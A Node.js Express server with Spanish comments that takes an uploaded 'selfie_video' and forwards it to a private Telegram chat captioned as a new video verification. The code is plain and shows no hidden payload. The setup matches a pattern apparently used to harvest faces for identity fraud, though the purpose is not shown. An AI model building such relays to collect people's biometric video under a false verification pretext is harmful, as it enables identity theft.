const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

// --- Configuración de Seguridad ---
// ¡NUNCA escribas los tokens aquí! Usa variables de entorno.
// En tu panel de hosting (Render, Vercel, etc.) define estas variables:
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Error: Las variables TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID deben estar definidas.");
    process.exit(1);
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

const app = express();
const port = process.env.PORT || 3000;

// Configuración de Multer para recibir el archivo EN MEMORIA (¡no en disco!)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// --- Servir los archivos del Frontend ---
// (Sirve tu index.html, style.css y script.js)
app.use(express.static(path.join(__dirname, 'public'))); 
// (Asumiendo que tus archivos HTML/CSS/JS están en una carpeta 'public')

// --- El Endpoint Mágico ---
// Esta es la URL que el frontend (script.js) llamó: /api/enviar-a-telegram
app.post('/api/enviar-a-telegram', upload.single('video'), async (req, res) => {
    
    console.log("Video recibido, intentando enviar a Telegram...");

    // 1. Validar que el archivo exista
    if (!req.file) {
        console.error("No se recibió ningún archivo de video.");
        return res.status(400).send({ error: 'No se recibió ningún archivo.' });
    }

    try {
        // 2. Crear un FormData para Telegram
        const formData = new FormData();
        
        // 'req.file.buffer' es el video en la MEMORIA (RAM)
        formData.append('video', req.file.buffer, {
            filename: req.file.originalname || `selfie_video.webm`,
            contentType: req.file.mimetype || 'video/webm',
        });
        
        // El ID del chat al que se enviará
        formData.append('chat_id', CHAT_ID);
        
        // (Opcional) Enviar un mensaje junto al video
        const caption = `Nueva verificación de video recibida.`;
        formData.append('caption', caption);

        // 3. Enviar el video a la API de Telegram usando Axios
        await axios.post(TELEGRAM_API_URL, formData, {
            headers: formData.getHeaders()
        });

        console.log("¡Video enviado a Telegram con éxito!");

        // 4. Responder al frontend con éxito
        res.status(200).send({ success: true, message: 'Video enviado a Telegram.' });

    } catch (error) {
        console.error("Error al enviar el video a Telegram:", error.response ? error.response.data : error.message);
        res.status(500).send({ error: 'Error interno al procesar el video.' });
    }
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});